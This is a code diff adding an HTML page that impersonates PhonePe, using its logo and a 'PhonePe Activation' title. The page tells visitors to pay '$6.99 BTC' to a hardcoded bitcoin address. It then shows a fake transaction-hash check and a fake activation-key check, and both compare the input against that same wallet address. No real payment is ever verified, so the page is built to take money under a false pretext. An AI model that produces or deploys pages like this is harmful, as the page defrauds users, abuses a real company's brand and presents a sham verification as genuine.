@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypto Settings</title>
+
+  <!-- Bootstrap CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet" />
+  <!-- MDB CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.0/mdb.min.css" rel="stylesheet" />
+
+  <style>
+    .message {
+      font-weight: 500;
+      font-size: 0.9rem;
+    }
+    .message.success {
+      color: green;
+    }
+    .message.error {
+      color: red;
+    }
+    .logo {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <section class="p-4 p-md-5" style="background-image: url(https://mdbcdn.b-cdn.net/img/Photos/Others/background3.webp);">
+    <div class="row d-flex justify-content-center">
+      <div class="col-md-10 col-lg-8 col-xl-5">
+        <div class="card rounded-3">
+          <div class="card-body p-4">
+            <div class="text-center mb-4">
+              <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/phonepe-icon.png" class="logo" alt="PhonePe Logo" />
+
+              <h3>PhonePe Activation</h3>
+              <h6>Bitcoin Wallet</h6>
+            </div>
+            <form id="cryptoForm" onsubmit="return false;">
+              <p class="fw-bold mb-4 pb-2">Transfer $6.99 BTC:</p>
+              <div class="d-flex flex-row align-items-center mb-4 pb-1">
+                <img class="img-fluid" src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=025" width="40" />
+                <div class="flex-fill mx-3">
+                  <div class="form-outline">
+                    <input type="text" id="btcAddress1" class="form-control form-control-lg" 
+                      value="bc1q6vnlkgs42x5dry6pd5ew4ne7cewz2fnsjhx2er" readonly />
+                    <label class="form-label" for="btcAddress1">Bitcoin Address</label>
+                  </div>
+                </div>
+              </div>
+
+              <p class="fw-bold mb-2">Verify the transaction by entering the BTC transaction Hash:</p>
+              <div class="form-outline mb-1">
+                <input type="text" id="newBTCWallet" class="form-control form-control-lg" placeholder="Enter Transaction Hash" />
+                <label class="form-label" for="newBTCWallet">Transaction Hash</label>
+              </div>
+              <div id="hashMessage" class="message mb-3"></div>
+
+              <button type="button" class="btn btn-success btn-lg btn-block mb-4" id="verifyBtn">Verify</button>
+
+              <hr />
+
+              <div class="form-outline mb-1">
+                <input type="text" id="activationKey" class="form-control form-control-lg" placeholder="Enter activation key" />
+                <label class="form-label" for="activationKey">Activation Key</label>
+              </div>
+              <div id="keyMessage" class="message mb-3"></div>
+
+              <button type="button" class="btn btn-primary btn-lg btn-block" id="activateBtn">Activate</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- MDB and Bootstrap JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.0/mdb.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Validation Script -->
+  <script>
+    const correctHash = "bc1q6vnlkgs42x5dry6pd5ew4ne7cewz2fnsjhx2er";        // Set your valid hash here
+    const correctKey = "bc1q6vnlkgs42x5dry6pd5ew4ne7cewz2fnsjhx2er";     // Set your valid activation key here
+
+    document.getElementById('verifyBtn').addEventListener('click', function () {
+      const hashInput = document.getElementById('newBTCWallet').value.trim();
+      const hashMessage = document.getElementById('hashMessage');
+
+      if (hashInput === correctHash) {
+        hashMessage.textContent = "✅ Transaction Hash Verified!";
+        hashMessage.className = "message success";
+      } else {
+        hashMessage.textContent = "❌ Incorrect Transaction Hash!";
+        hashMessage.className = "message error";
+      }
+    });
+
+    document.getElementById('activateBtn').addEventListener('click', function () {
+      const keyInput = document.getElementById('activationKey').value.trim();
+      const keyMessage = document.getElementById('keyMessage');
+
+      if (keyInput === correctKey) {
+        keyMessage.textContent = "✅ Activation Successful!";
+        keyMessage.className = "message success";
+      } else {
+        keyMessage.textContent = "❌ Incorrect Activation Key!";
+        keyMessage.className = "message error";
+      }
+    });
+  </script>
+</body>
+</html>
